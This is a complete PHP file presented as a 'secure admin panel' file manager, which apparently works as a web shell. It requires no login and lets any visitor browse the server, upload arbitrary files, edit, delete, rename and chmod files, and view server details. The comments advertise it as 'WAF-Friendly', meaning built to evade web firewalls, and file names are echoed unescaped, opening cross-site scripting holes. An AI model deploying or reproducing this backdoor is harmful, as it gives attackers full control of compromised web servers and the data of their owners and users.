<?php
// File Management System - Secure Admin Panel
// WAF-Friendly File Manager
// PHP 5.3+ Compatible

$s = DIRECTORY_SEPARATOR;
$r = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
$c = isset($_GET['p']) ? $_GET['p'] : $r;
$c = realpath($c);
if (!$c) $c = $r;
if (!is_dir($c)) $c = $r;

$m = '';
$e = '';

// File Upload
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['f'])) {
    $u = $c . $s . basename($_FILES['f']['name']);
    if (move_uploaded_file($_FILES['f']['tmp_name'], $u)) {
        $m = 'File uploaded successfully';
    } else {
        $e = 'Upload failed';
    }
}

// File Delete
if (isset($_GET['d']) && isset($_GET['t'])) {
    $p = $c . $s . $_GET['d'];
    if ($_GET['t'] == 'dir') {
        @rmdir($p);
    } else {
        @unlink($p);
    }
    header('Location: ?p=' . urlencode($c));
    exit;
}

// Rename
if (isset($_POST['rn']) && isset($_POST['o']) && isset($_POST['n'])) {
    $o = $c . $s . $_POST['o'];
    $n = $c . $s . $_POST['n'];
    @rename($o, $n);
    header('Location: ?p=' . urlencode($c));
    exit;
}

// Create File/Folder
if (isset($_POST['c'])) {
    $n = isset($_POST['fn']) ? $_POST['fn'] : '';
    $tp = isset($_POST['tp']) ? $_POST['tp'] : 'file';
    if ($n) {
        $fp = $c . $s . $n;
        if ($tp == 'folder') {
            @mkdir($fp, 0755);
        } else {
            @file_put_contents($fp, '');
        }
    }
    header('Location: ?p=' . urlencode($c));
    exit;
}

// Save Edit
if (isset($_POST['s']) && isset($_POST['fn']) && isset($_POST['ct'])) {
    $fp = $c . $s . $_POST['fn'];
    @file_put_contents($fp, $_POST['ct']);
    header('Location: ?p=' . urlencode($c));
    exit;
}

// Chmod
if (isset($_POST['ch']) && isset($_POST['fn']) && isset($_POST['md'])) {
    $fp = $c . $s . $_POST['fn'];
    $md = octdec($_POST['md']);
    @chmod($fp, $md);
    header('Location: ?p=' . urlencode($c));
    exit;
}

// Get file info
$ed = isset($_GET['e']) ? $_GET['e'] : '';
$ec = '';
if ($ed && file_exists($c . $s . $ed)) {
    $ec = @file_get_contents($c . $s . $ed);
}

// List contents
$it = array();
if (is_dir($c)) {
    $it = scandir($c);
}

// Get disk info
$du = function_exists('disk_free_space') ? disk_free_space($r) : 0;
$dt = function_exists('disk_total_space') ? disk_total_space($r) : 0;
$dp = $dt > 0 ? round((($dt - $du) / $dt) * 100, 2) : 0;

// Format bytes function
function formatBytes($b) {
    $u = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($b >= 1024 && $i < count($u) - 1) {
        $b = $b / 1024;
        $i++;
    }
    return round($b, 2) . ' ' . $u[$i];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Control Panel v2.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 13px;
        }
        .wrapper { display: flex; min-height: 100vh; }
        .sidebar {
            width: 220px;
            background: #161b22;
            border-right: 1px solid #30363d;
            padding: 15px;
        }
        .logo {
            text-align: center;
            padding: 15px 0;
            border-bottom: 1px solid #30363d;
            margin-bottom: 15px;
        }
        .logo h2 {
            color: #58a6ff;
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .logo span {
            font-size: 10px;
            color: #8b949e;
        }
        .nav-item {
            padding: 10px 12px;
            margin: 3px 0;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
            color: #c9d1d9;
            text-decoration: none;
            display: block;
        }
        .nav-item:hover, .nav-item.active {
            background: #21262d;
            color: #58a6ff;
        }
        .nav-item i { margin-right: 8px; width: 16px; display: inline-block; }
        .stats {
            margin-top: 20px;
            padding: 15px;
            background: #0d1117;
            border-radius: 8px;
            border: 1px solid #30363d;
        }
        .stats h4 {
            font-size: 11px;
            color: #8b949e;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .stat-item {
            display: flex;
            justify-content: space-between;
            margin: 5px 0;
            font-size: 12px;
        }
        .progress {
            height: 4px;
            background: #21262d;
            border-radius: 2px;
            margin-top: 8px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #238636, #2ea043);
            border-radius: 2px;
        }
        .main {
            flex: 1;
            padding: 20px;
            overflow-x: auto;
        }
        .header {
            background: #161b22;
            padding: 15px 20px;
            border-radius: 8px;
            border: 1px solid #30363d;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
        }
        .breadcrumb a {
            color: #58a6ff;
            text-decoration: none;
            padding: 3px 8px;
            background: #0d1117;
            border-radius: 4px;
            margin-right: 5px;
            font-size: 12px;
        }
        .breadcrumb a:hover { background: #21262d; }
        .breadcrumb span { margin: 0 5px; color: #8b949e; }
        .actions { display: flex; gap: 10px; }
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn-primary { background: #1f6feb; color: white; }
        .btn-primary:hover { background: #388bfd; }
        .btn-success { background: #238636; color: white; }
        .btn-success:hover { background: #2ea043; }
        .btn-danger { background: #da3633; color: white; }
        .btn-danger:hover { background: #f85149; }
        .btn-sm { padding: 5px 10px; font-size: 11px; }
        .panel {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .panel-header {
            padding: 15px 20px;
            border-bottom: 1px solid #30363d;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .panel-title { font-size: 14px; font-weight: 600; color: #f0f6fc; }
        .panel-body { padding: 0; }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #30363d;
        }
        th {
            background: #0d1117;
            font-weight: 600;
            color: #8b949e;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        tr:hover { background: #0d1117; }
        td { font-size: 13px; }
        .icon {
            width: 20px;
            height: 20px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
            font-size: 14px;
        }
        .dir { color: #58a6ff; }
        .file { color: #a371f7; }
        .size { color: #8b949e; font-size: 12px; }
        .perm {
            font-family: monospace;
            background: #0d1117;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
        }
        .perm-w { color: #3fb950; }
        .perm-r { color: #8b949e; }
        .actions-cell { display: flex; gap: 5px; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            padding: 25px;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .modal-title { font-size: 16px; font-weight: 600; }
        .close {
            background: none;
            border: none;
            color: #8b949e;
            font-size: 20px;
            cursor: pointer;
        }
        .close:hover { color: #f0f6fc; }
        .form-group { margin-bottom: 15px; }
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 12px;
            color: #8b949e;
        }
        .form-control {
            width: 100%;
            padding: 10px 12px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 13px;
        }
        .form-control:focus {
            outline: none;
            border-color: #58a6ff;
        }
        textarea.form-control {
            min-height: 400px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            line-height: 1.5;
        }
        .alert {
            padding: 12px 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 13px;
        }
        .alert-success { background: rgba(35, 134, 54, 0.2); border: 1px solid #238636; color: #3fb950; }
        .alert-error { background: rgba(218, 54, 51, 0.2); border: 1px solid #da3633; color: #f85149; }
        .edit-panel { margin-top: 20px; }
        .edit-header {
            background: #0d1117;
            padding: 15px 20px;
            border: 1px solid #30363d;
            border-bottom: none;
            border-radius: 8px 8px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .edit-body {
            border: 1px solid #30363d;
            border-radius: 0 0 8px 8px;
            overflow: hidden;
        }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #8b949e;
        }
        .empty-state-icon { font-size: 48px; margin-bottom: 15px; }
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <aside class="sidebar">
            <div class="logo">
                <h2>WASO</h2>
                <span>Web Admin System Organizer</span>
            </div>
            
            <nav>
                <a href="?p=<?php echo urlencode($r); ?>" class="nav-item <?php echo $c == $r ? 'active' : ''; ?>">
                    &#127968; Home Directory
                </a>
                <a href="?p=<?php echo urlencode(dirname($c) ?: $r); ?>" class="nav-item">
                    &#11014; Parent Directory
                </a>
                <a href="#" class="nav-item" onclick="showModal('uploadModal'); return false;">
                    &#128228; Upload File
                </a>
                <a href="#" class="nav-item" onclick="showModal('createModal'); return false;">
                    &#10133; New Item
                </a>
                <a href="#" class="nav-item" onclick="location.reload(); return false;">
                    &#128260; Refresh
                </a>
            </nav>
            
            <div class="stats">
                <h4>Server Information</h4>
                <div class="stat-item">
                    <span>PHP Version</span>
                    <span><?php echo phpversion(); ?></span>
                </div>
                <div class="stat-item">
                    <span>Server Software</span>
                    <span><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'; ?></span>
                </div>
                <div class="stat-item">
                    <span>Disk Usage</span>
                    <span><?php echo $dp; ?>%</span>
                </div>
                <div class="progress">
                    <div class="progress-bar" style="width: <?php echo $dp; ?>%"></div>
                </div>
                <div class="stat-item" style="margin-top: 10px;">
                    <span>Free Space</span>
                    <span><?php echo formatBytes($du); ?></span>
                </div>
            </div>
        </aside>
        
        <main class="main">
            <?php if ($m): ?>
                <div class="alert alert-success">&#10003; <?php echo $m; ?></div>
            <?php endif; ?>
            <?php if ($e): ?>
                <div class="alert alert-error">&#10007; <?php echo $e; ?></div>
            <?php endif; ?>
            
            <div class="header">
                <div class="breadcrumb">
                    <?php
                    $ps = explode($s, $c);
                    $bp = '';
                    foreach ($ps as $i => $p) {
                        if (empty($p)) continue;
                        $bp .= $s . $p;
                        echo '<a href="?p=' . urlencode($bp) . '">' . $p . '</a>';
                        if ($i < count($ps) - 1) echo '<span>/</span>';
                    }
                    ?>
                </div>
                <div class="actions">
                    <button class="btn btn-success" onclick="showModal('createModal')">
                        &#10133; New
                    </button>
                    <button class="btn btn-primary" onclick="showModal('uploadModal')">
                        &#128228; Upload
                    </button>
                </div>
            </div>
            
            <?php if (!$ed): ?>
            <div class="panel">
                <div class="panel-header">
                    <span class="panel-title">&#128193; Directory Contents</span>
                    <span style="color: #8b949e; font-size: 12px;">
                        <?php echo count($it) - 2; ?> items
                    </span>
                </div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th style="width: 50%">Name</th>
                                <th style="width: 15%">Size</th>
                                <th style="width: 15%">Permissions</th>
                                <th style="width: 15%">Modified</th>
                                <th style="width: 15%">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $dc = 0;
                            $fc = 0;
                            foreach ($it as $n):
                                if ($n == '.' || $n == '..') continue;
                                $fp = $c . $s . $n;
                                $isd = is_dir($fp);
                                if ($isd) $dc++; else $fc++;
                                $sz = $isd ? '-' : formatBytes(filesize($fp));
                                $pm = substr(sprintf('%o', fileperms($fp)), -4);
                                $mt = date('Y-m-d H:i', filemtime($fp));
                            ?>
                            <tr>
                                <td>
                                    <span class="icon <?php echo $isd ? 'dir' : 'file'; ?>">
                                        <?php echo $isd ? '&#128193;' : '&#128196;'; ?>
                                    </span>
                                    <?php if ($isd): ?>
                                        <a href="?p=<?php echo urlencode($fp); ?>" style="color: #58a6ff; text-decoration: none;">
                                            <?php echo $n; ?>
                                        </a>
                                    <?php else: ?>
                                        <span><?php echo $n; ?></span>
                                    <?php endif; ?>
                                </td>
                                <td class="size"><?php echo $sz; ?></td>
                                <td>
                                    <span class="perm <?php echo is_writable($fp) ? 'perm-w' : 'perm-r'; ?>">
                                        <?php echo $pm; ?>
                                    </span>
                                </td>
                                <td style="color: #8b949e; font-size: 12px;"><?php echo $mt; ?></td>
                                <td>
                                    <div class="actions-cell">
                                        <?php if (!$isd): ?>
                                            <a href="?p=<?php echo urlencode($c); ?>&e=<?php echo urlencode($n); ?>" class="btn btn-sm btn-primary">Edit</a>
                                        <?php endif; ?>
                                        <button class="btn btn-sm" style="background: #8957e5; color: white;" onclick="showRename('<?php echo $n; ?>')">Rename</button>
                                        <button class="btn btn-sm" style="background: #d29922; color: black;" onclick="showChmod('<?php echo $n; ?>', '<?php echo $pm; ?>')">Chmod</button>
                                        <a href="?p=<?php echo urlencode($c); ?>&d=<?php echo urlencode($n); ?>&t=<?php echo $isd ? 'dir' : 'file'; ?>"
                                           class="btn btn-sm btn-danger"
                                           onclick="return confirm('Delete <?php echo $n; ?>?')">Delete</a>
                                    </div>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                            <?php if (empty($it) || count($it) <= 2): ?>
                            <tr>
                                <td colspan="5">
                                    <div class="empty-state">
                                        <div class="empty-state-icon">&#128450;</div>
                                        <p>This directory is empty</p>
                                    </div>
                                </td>
                            </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            <?php endif; ?>
            
            <?php if ($ed): ?>
            <div class="edit-panel">
                <div class="edit-header">
                    <span>&#9998; Editing: <strong><?php echo $ed; ?></strong></span>
                    <a href="?p=<?php echo urlencode($c); ?>" class="btn btn-sm" style="background: #30363d; color: #c9d1d9;">&larr; Back</a>
                </div>
                <div class="edit-body">
                    <form method="POST">
                        <input type="hidden" name="fn" value="<?php echo $ed; ?>">
                        <textarea name="ct" class="form-control" style="border-radius: 0; border: none;"><?php echo htmlspecialchars($ec); ?></textarea>
                        <div style="padding: 15px; background: #0d1117; border-top: 1px solid #30363d;">
                            <button type="submit" name="s" class="btn btn-success">&#128190; Save Changes</button>
                            <a href="?p=<?php echo urlencode($c); ?>" class="btn" style="background: #30363d; color: #c9d1d9;">Cancel</a>
                        </div>
                    </form>
                </div>
            </div>
            <?php endif; ?>
        </main>
    </div>
    
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="modal-title">&#128228; Upload File</span>
                <button class="close" onclick="hideModal('uploadModal')">&times;</button>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label>Select File</label>
                    <input type="file" name="f" class="form-control" required>
                </div>
                <button type="submit" class="btn btn-success">Upload</button>
                <button type="button" class="btn" style="background: #30363d; color: #c9d1d9;" onclick="hideModal('uploadModal')">Cancel</button>
            </form>
        </div>
    </div>
    
    <div id="createModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="modal-title">&#10133; Create New</span>
                <button class="close" onclick="hideModal('createModal')">&times;</button>
            </div>
            <form method="POST">
                <div class="form-group">
                    <label>Type</label>
                    <div class="checkbox-wrapper">
                        <input type="radio" name="tp" value="file" id="tpFile" checked>
                        <label for="tpFile" style="margin: 0;">&#128196; File</label>
                        <input type="radio" name="tp" value="folder" id="tpFolder">
                        <label for="tpFolder" style="margin: 0;">&#128193; Folder</label>
                    </div>
                </div>
                <div class="form-group">
                    <label>Name</label>
                    <input type="text" name="fn" class="form-control" placeholder="Enter name..." required>
                </div>
                <button type="submit" name="c" class="btn btn-success">Create</button>
                <button type="button" class="btn" style="background: #30363d; color: #c9d1d9;" onclick="hideModal('createModal')">Cancel</button>
            </form>
        </div>
    </div>
    
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="modal-title">&#9998; Rename Item</span>
                <button class="close" onclick="hideModal('renameModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="o" id="renameOld">
                <div class="form-group">
                    <label>Current Name</label>
                    <input type="text" id="renameCurrent" class="form-control" readonly style="background: #21262d;">
                </div>
                <div class="form-group">
                    <label>New Name</label>
                    <input type="text" name="n" class="form-control" placeholder="Enter new name..." required>
                </div>
                <button type="submit" name="rn" class="btn btn-success">Rename</button>
                <button type="button" class="btn" style="background: #30363d; color: #c9d1d9;" onclick="hideModal('renameModal')">Cancel</button>
            </form>
        </div>
    </div>
    
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="modal-title">&#128272; Change Permissions</span>
                <button class="close" onclick="hideModal('chmodModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="fn" id="chmodFile">
                <div class="form-group">
                    <label>Target File</label>
                    <input type="text" id="chmodTarget" class="form-control" readonly style="background: #21262d;">
                </div>
                <div class="form-group">
                    <label>Permission (e.g., 0755, 0644)</label>
                    <input type="text" name="md" id="chmodMode" class="form-control" placeholder="0755" required>
                </div>
                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <button type="button" class="btn btn-sm" style="background: #21262d;" onclick="setChmod('0755')">0755</button>
                    <button type="button" class="btn btn-sm" style="background: #21262d;" onclick="setChmod('0644')">0644</button>
                    <button type="button" class="btn btn-sm" style="background: #21262d;" onclick="setChmod('0777')">0777</button>
                </div>
                <button type="submit" name="ch" class="btn btn-success">Apply</button>
                <button type="button" class="btn" style="background: #30363d; color: #c9d1d9;" onclick="hideModal('chmodModal')">Cancel</button>
            </form>
        </div>
    </div>
    
    <script>
        function showModal(id) {
            document.getElementById(id).classList.add('active');
        }
        
        function hideModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        function showRename(name) {
            document.getElementById('renameOld').value = name;
            document.getElementById('renameCurrent').value = name;
            showModal('renameModal');
        }
        
        function showChmod(file, mode) {
            document.getElementById('chmodFile').value = file;
            document.getElementById('chmodTarget').value = file;
            document.getElementById('chmodMode').value = mode;
            showModal('chmodModal');
        }
        
        function setChmod(mode) {
            document.getElementById('chmodMode').value = mode;
        }
        
        window.onclick = function(e) {
            if (e.target.classList.contains('modal')) {
                e.target.classList.remove('active');
            }
        }
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                var modals = document.querySelectorAll('.modal');
                for (var i = 0; i < modals.length; i++) {
                    modals[i].classList.remove('active');
                }
            }
        });
    </script>
</body>
</html>
